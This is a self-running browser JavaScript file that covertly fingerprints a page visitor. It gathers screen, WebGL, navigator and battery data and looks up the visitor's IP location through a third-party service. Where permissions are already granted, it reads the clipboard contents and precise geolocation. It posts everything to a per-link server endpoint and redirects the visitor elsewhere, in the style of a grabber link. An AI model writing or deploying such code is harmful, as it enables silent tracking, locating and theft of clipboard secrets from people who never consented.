const getScreenData = async () => {
  const { screen } = window;
  const data = {};

  data.width = screen.width;
  data.height = screen.height;
  data.pixelDepth = screen.pixelDepth;
  data.colorDepth = screen.colorDepth;
  data.orientation = screen.orientation.type;

  return data;
};

const getIPData = async () => {
  let data;
  try {
    const res = await fetch("https://ipapi.co/json");
    data = await res.json();
  } catch (err) {
    return {};
  }

  return {
    address: data.ip,
    asn: data.asn,
    org: data.org,
    city: data.city,
    postal: data.postal,
    region: data.region,
    latitude: data.latitude,
    longitude: data.longitude,
    timezone: data.timezone,
    utcOffset: data.utc_offset,
  };
};

const getPermissions = async () => {
  const permissionList = [
    "accelerometer",
    "accessibility-events",
    "ambient-light-sensor",
    "background-sync",
    "camera",
    "clipboard-read",
    "clipboard-write",
    "geolocation",
    "gyroscope",
    "magnetometer",
    "microphone",
    "midi",
    "notifications",
    "payment-handler",
    "persistent-storage",
    "push",
  ];

  const permissions = {};
  for (const permission of permissionList) {
    try {
      const status = await navigator.permissions.query({ name: permission });
      permissions[permission] = status.state;
    } catch (e) {
      permissions[permission] = "errored";
    }
  }

  return permissions;
};

const getWebGL = async () => {
  const canvas = document.createElement("canvas");
  const gl =
    canvas.getContext("webgl") || canvas.getContext("experimental-webgl");

  const getUnmaskedInfo = () => {
    const unMaskedInfo = {
      renderer: "",
      vendor: "",
    };

    const dbgRenderInfo = gl.getExtension("WEBGL_debug_renderer_info");
    if (dbgRenderInfo != null) {
      unMaskedInfo.renderer = gl.getParameter(
        dbgRenderInfo.UNMASKED_RENDERER_WEBGL
      );
      unMaskedInfo.vendor = gl.getParameter(
        dbgRenderInfo.UNMASKED_VENDOR_WEBGL
      );
    }

    return unMaskedInfo;
  };

  const data = {
    version: gl.getParameter(gl.VERSION),
    vendor: getUnmaskedInfo().vendor,
    renderer: getUnmaskedInfo().renderer,
  };

  return data;
};

const getNavigator = async () => {
  return {
    platform: window.navigator.platform,
    cookiesEnabled: window.navigator.cookieEnabled,
    languages: window.navigator.languages,
    dnt: window.navigator.doNotTrack,
    timezoneOffset: new Date().getTimezoneOffset(),
    productSub: window.navigator.productSub,
    vendorSub: window.navigator.vendorSub,
    threads: window.navigator.hardwareConcurrency,
  };
};

const getBattery = async () => {
  const bm = await navigator.getBattery();

  return {
    charging: bm.charging,
    level: bm.level,
    chargingTime: bm.chargingTime,
  };
};

const getPreciseGeo = async () => {
  return new Promise((resolve, reject) => {
    navigator.geolocation.getCurrentPosition(resolve, reject);
  });
};

const detect = async () => {
  const permissions = await getPermissions();

  const data = {
    permissions: permissions,
    screen: await getScreenData(),
    ip: await getIPData(),
    webgl: await getWebGL(),
    navigator: await getNavigator(),
    battery: await getBattery(),
  };

  if (permissions["clipboard-read"] == "granted") {
    data["clipboard"] = {
      ok: true,
      content: await navigator.clipboard.readText(),
    };
  }

  if (permissions["geolocation"] == "granted") {
    const geo = await getPreciseGeo();
    const coords = {
      latitude: geo.coords.latitude,
      longitude: geo.coords.longitude,
      accuracy: geo.coords.accuracy,
      altitude: geo.coords.altitude,
    };

    data["preciseGeo"] = {
      ok: true,
      coords: coords,
    };
  }

  return data;
};

(async () => {
  const data = await detect();
  const res = await fetch(`/a/${window.cid}`, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify(data),
  });

  const json = await res.json();
  window.location = json.forward;
})();
